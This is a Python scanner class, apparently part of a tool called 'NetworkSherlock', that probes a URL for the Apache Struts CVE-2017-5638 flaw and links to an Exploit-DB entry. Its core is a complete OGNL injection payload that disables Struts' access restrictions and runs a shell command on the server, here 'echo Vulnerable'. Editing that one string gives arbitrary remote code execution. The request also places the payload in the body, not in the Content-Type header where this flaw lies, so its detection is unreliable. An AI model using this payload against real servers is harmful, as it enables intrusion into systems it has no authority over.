import requests
from colorama import Fore, Style, init

init(autoreset=True)

class ApacheStrutsScanner:
    def __init__(self, target_url):
        self.target_url = target_url

    def scan_for_apache_struts(self):
        headers = {
            "Content-Type": "application/xml",
            "User-Agent": "NetworkSherlock/1.0"
        }

        # Apache Struts CVE-2017-5638 için özel hazırlanmış istek
        payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."\
                  "(#_memberAccess?(#_memberAccess=#dm):" \
                  "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
                  "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
                  "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())." \
                  "(#context.setMemberAccess(#dm))))." \
                  "(#cmd='echo Vulnerable').(#iswin=(@java.lang.System@getProperty('os.name')" \
                  ".toLowerCase().contains('win')))." \
                  "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." \
                  "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))." \
                  "(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse()" \
                  ".getOutputStream()))." \
                  "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." \
                  "(#ros.flush())}"

        try:
            response = requests.post(self.target_url, headers=headers, data=payload, timeout=10)
            if "Vulnerable" in response.text:
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Vulnerable CVE-2017-5638       : {Fore.BLUE}https://www.exploit-db.com/exploits/41570{Style.RESET_ALL}")
            else:
                pass
        except Exception as e:
            pass